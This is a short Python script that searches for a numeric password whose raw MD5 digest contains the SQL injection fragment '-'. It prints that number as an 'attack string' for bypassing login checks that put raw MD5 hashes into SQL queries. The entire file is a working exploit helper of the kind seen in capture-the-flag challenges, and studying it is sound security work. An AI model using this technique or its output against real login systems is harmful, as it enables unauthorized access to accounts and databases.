
from hashlib import md5

# The desired SQL injection to execute
SQL_INJECTION_STRING = "'-'"

attack_string = ""
counter = 0

# Increment counter until its hash contains the injection string
while True:
    password = str(counter).encode("utf-8")
    hashed_password = md5(password)
    # Interpret hash as string
    hashed_password_as_string = "".join(map(chr, hashed_password.digest()))
    if SQL_INJECTION_STRING in hashed_password_as_string:
        attack_string = str(counter)
        break
    counter += 1

# Return the attack string to use
print(attack_string)
